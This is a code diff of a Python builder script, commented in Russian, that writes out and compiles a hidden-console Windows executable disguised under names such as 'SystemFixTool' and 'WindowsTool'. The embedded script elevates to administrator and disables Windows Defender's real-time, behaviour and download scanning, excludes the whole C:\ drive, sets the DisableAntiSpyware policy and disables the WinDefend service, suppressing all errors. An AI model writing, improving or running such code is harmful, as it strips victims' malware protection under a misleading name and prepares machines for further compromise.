@@ -19,70 +19,43 @@ def run_as_admin():
     try:
         if ctypes.windll.shell32.IsUserAnAdmin():
             return True
-        else:
-            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-            return False
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+        return False
     except:
         return False
 
-# Запускаем от имени администратора
 if not run_as_admin():
     sys.exit()
 
-def disable_defender_permanent():
-    try:
-        # 1. Команды реестра - ОСНОВНОЕ ОТКЛЮЧЕНИЕ
-        reg_commands = [
-            'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
-            'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f',
-            'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f'
-        ]
-        
-        # 2. Останавливаем службы
-        service_commands = [
-            'net stop WinDefend /y',
-            'sc config WinDefend start= disabled',
-            'net stop WdNisSvc /y', 
-            'sc config WdNisSvc start= disabled'
-        ]
-        
-        # 3. PowerShell команды
-        ps_commands = [
-            "Set-MpPreference -DisableRealtimeMonitoring $true",
-            "Set-MpPreference -DisableBehaviorMonitoring $true",
-            "Set-MpPreference -DisableIOAVProtection $true"
-        ]
-        
-        # Выполняем команды
-        for cmd in reg_commands:
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-            print(f"Registry: {cmd} - {result.returncode}")
-            time.sleep(0.5)
-            
-        for cmd in service_commands:
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-            print(f"Service: {cmd} - {result.returncode}")
-            time.sleep(0.5)
-            
-        for cmd in ps_commands:
-            result = subprocess.run(["powershell", "-Command", cmd], capture_output=True, text=True)
-            print(f"PowerShell: {cmd} - {result.returncode}")
-            time.sleep(0.5)
-            
-        print("Windows Defender успешно отключен")
-        
-    except Exception as e:
-        print(f"Ошибка: {e}")
+time.sleep(2)
 
-disable_defender_permanent()
+# Только самые важные команды которые точно работают
+commands = [
+    'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
+    'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
+    'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
+    'powershell -Command "Add-MpPreference -ExclusionPath C:\\\\"',
+    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
+    'sc stop WinDefend',
+    'sc config WinDefend start= disabled'
+]
+
+for cmd in commands:
+    try:
+        subprocess.run(cmd, shell=True, timeout=10)
+        time.sleep(1)
+    except:
+        pass
+
+print("Completed")
 '''
 
-    with open('system_fix.py', 'w', encoding='utf-8') as f:
+    with open('simple_defender_disable.py', 'w', encoding='utf-8') as f:
         f.write(disabler_code)
 
 def compile_to_exe():
-    os.system('pyinstaller --onefile --noconsole --name "SystemFixTool" system_fix.py')
-    print("Скомпилировано как SystemFixTool.exe")
+    os.system('pyinstaller --onefile --noconsole --name "WindowsTool" simple_defender_disable.py')
+    print("EXE создан: WindowsTool.exe")
 
 if __name__ == "__main__":
     install_pyinstaller()
